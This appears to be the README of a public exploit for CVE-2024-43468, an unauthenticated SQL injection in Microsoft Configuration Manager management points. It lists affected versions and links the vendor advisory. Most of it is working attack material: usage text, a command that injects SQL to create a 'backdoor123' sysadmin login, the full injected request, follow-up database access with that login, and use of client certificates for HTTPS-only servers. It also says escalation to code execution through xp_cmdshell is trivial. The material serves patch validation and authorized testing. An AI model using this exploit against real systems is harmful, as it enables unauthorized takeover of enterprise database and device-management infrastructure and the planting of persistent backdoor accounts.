# Microsoft Configuration Manager (ConfigMgr / SCCM) 2403 Unauthenticated SQL injections (CVE-2024-43468) exploit

This script exploits the [CVE-2024-43468](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-43468) that allows an unauthenticated attacker, with network access to a Management Point, to execute arbitrary SQL queries on the site database.

As queries are executed as the MP machine account identity, granted the sysadmin role, it is trivial to escalate the SQL injection to remote code execution (with `xp_cmdshell` for example).

When KB29166583 is missing, all the following Microsoft Configuration Manager versions are vulnerable:
* < 2403 (5.00.9128.1024)
* < 2309 (5.00.9122.1033)
* < 2303 (5.00.9106.1037)
* <= 2211 (*)

For more details, please refer to the associated advisory available at https://www.synacktiv.com/advisories/microsoft-configuration-manager-configmgr-2403-unauthenticated-sql-injections

## Requirements

* In some cases, when the management point is configured with *HTTPS Only* communication mode, a PKI certificate is required to perform mutual TLS authentication against the vulnerable HTTP service. Any certificate issued by the internal PKI with the *Client Authentication* purpose will work.

## Usage

```bash
$ python3 CVE-2024-43468.py --help
usage: CVE-2024-43468.py [-h] -t TARGET -sql SQL [-machineid MACHINEID] -k KEY -c CERT

SCCM LocationMgr (MP_Location) Unauthenticated SQL injections - CVE-2024-43468

options:
  -h, --help            show this help message and exit
  -t TARGET, --target TARGET
                        Target (http[s]://sccm-mp.local/)
  -sql SQL              Query to execute through the MachineID SQL injection (e.g create login user123 with password = 'p4sswOrd' ; exec master.dbo.sp_addsrvrolemember 'user123', 'sysadmin' )
  -machineid MACHINEID  A valid MachineID for the second SQL injection via ContentID
  -k KEY, --key KEY     Private key file for mutual TLS
  -c CERT, --cert CERT  Certificate file for mutual TLS

```

- Create a new administrator user
```bash
$ python3 CVE-2024-43468.py -t http://sccm.local -sql "create login backdoor123 with password = 'P@sswOrd1'; exec master.dbo.sp_addsrvrolemember 'backdoor123', 'sysadmin'"
>>>> Header <<<<<
<Msg ReplyCompression="zlib" SchemaVersion="1.1"><Body Type="ByteRange" Length="556" Offset="0" /><CorrelationID>{00000000-0000-0000-0000-000000000000}</CorrelationID><Hooks><Hook3 Name="zlib-compress" /></Hooks><ID>{00000000-0000-0000-0000-000000000000}</ID><Payload Type="inline"/><Priority>0</Priority><Protocol>http</Protocol><ReplyMode>Sync</ReplyMode><ReplyTo>direct:dummyEndpoint:LS_ReplyLocations</ReplyTo><TargetAddress>mp:[http]MP_LocationManager</TargetAddress><TargetEndpoint>MP_LocationManager</TargetEndpoint><TargetHost>http://sccm.local</TargetHost><Timeout>60000</Timeout><SourceID>GUID:3b47a05a-db2e-40ef-8c77-cf29dac2ca1e'; create login backdoor123 with password = 'P@sswOrd1'; exec master.dbo.sp_addsrvrolemember 'backdoor123', 'sysadmin' ; select '1 </SourceID></Msg>

>>>> Request <<<<<
<UpdateSFRequest><Package ID="UID:060cb19a-4dde-4c6a-b08b-7fee96c4824b" Version="1"></Package><ClientLocationInfo><BoundaryGroups><BoundaryGroup GroupID="1" GroupGUID="00000000-0000-0000-0000-000000000000" GroupFlag="0"/></BoundaryGroups></ClientLocationInfo></UpdateSFRequest>


>>>> Response : 200 <<<<<
--aAbBcCdDv1234567890VxXyYzZ
content-type: text/plain; charset=UTF-16

ÿþNoReply
--aAbBcCdDv1234567890VxXyYzZ--
```

- Afterwards, access the SCCM the database with the newly created administrator.
```bash
$ mssqlclient.py  -debug './backdoor123:P@sswOrd1'@sccm-db.local
SQL (backdoor123  dbo@master)> use CM_ABC
SQL (backdoor123  dbo@CM_ABC)> select Name0 from v_R_System
Name0
------
DC
```


- Use mTLS in case the Management Point asks for a client certificate.
```bash
$ python3 CVE-2024-43468.py -t https://sccm.local -sql "..."
[...]
>>>> Response : 403 Client certificate required <<<<<
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">

$ python3 CVE-2024-43468.py -k any_client1.key -c any_client1.pem -t https://sccm.local -sql "..."
>>>> Response : 200 <<<<<
--aAbBcCdDv1234567890VxXyYzZ
content-type: text/plain; charset=UTF-16

ÿþNoReply
--aAbBcCdDv1234567890VxXyYzZ--
```



## References
* https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-43468